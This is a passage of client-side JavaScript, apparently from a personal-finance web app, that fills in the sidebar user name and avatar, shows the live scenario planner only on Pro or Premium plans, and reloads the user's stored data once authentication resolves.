const sidebarAvatar = document.getElementById('sidebar-avatar');
if (USER.name) {
  sidebarName.textContent = USER.name;
  sidebarAvatar.textContent = USER.name.charAt(0).toUpperCase();
}

// Plan gate (UX §6.25): mirror PFCPlan onto body[data-pfc-plan] so CSS
// switches between the editorial preview (Free) and the live UI
// (Pro/Premium). Free users skip the scenario init entirely — the hidden
// Chart.js + scenario list don't need to render.
let _liveInited = false;
function initLiveScenarios() {
  if (_liveInited) return;
  _liveInited = true;
  SCENARIOS = loadScenarios();
  renderAll();
  selectScenario('base');
}
function applyPlan() {
  const plan = (typeof PFCPlan !== 'undefined' && PFCPlan.get) ? PFCPlan.get() : 'free';
  document.body.setAttribute('data-pfc-plan', plan);
  if (plan === 'pro' || plan === 'premium') initLiveScenarios();
}
applyPlan();
if (typeof PFCPlan !== 'undefined') {
  PFCPlan.onChange(applyPlan);
  PFCPlan.refresh().then(applyPlan);
}

// ── AUTH-AWARE RE-HYDRATION ──
// loadUser()/loadScenarios() ran synchronously before PFCAuth resolved the real
// userId — so USER/SCENARIOS may reflect pfc:guest:* (often DEFAULT_USER zeros).
// Once auth resolves and pfc-storage.js finishes adoptGuestData, re-read from
// the now-correct namespace and re-render in place.
function _rehydrateFromStorage() {
  USER = loadUser();
  // Update sidebar avatar/name
  const sName = document.getElementById('sidebar-name');
  const sAvatar = document.getElementById('sidebar-avatar');
  if (USER.name && sName && sAvatar) {
    sName.textContent = USER.name;
    sAvatar.textContent = USER.name.charAt(0).toUpperCase();
  }
  // Only re-render scenarios UI if it was actually initialized (Pro/Premium).
  if (_liveInited) {
    SCENARIOS = loadScenarios();
    renderAll();
  }
}
if (typeof PFCAuth !== 'undefined') {
  PFCAuth.onReady(() => {
    const fresh = loadUser();
    if (JSON.stringify(fresh) !== JSON.stringify(USER)) _rehydrateFromStorage();
    else if (_liveInited) {
      // User unchanged but scenarios may have been adopted from guest namespace
      const freshSc = loadScenarios();
      if (JSON.stringify(freshSc) !== JSON.stringify(SCENARIOS)) {
        SCENARIOS = freshSc; renderAll();
      }
    }
  });
  PFCAuth.onAuthChange(_rehydrateFromStorage);
}
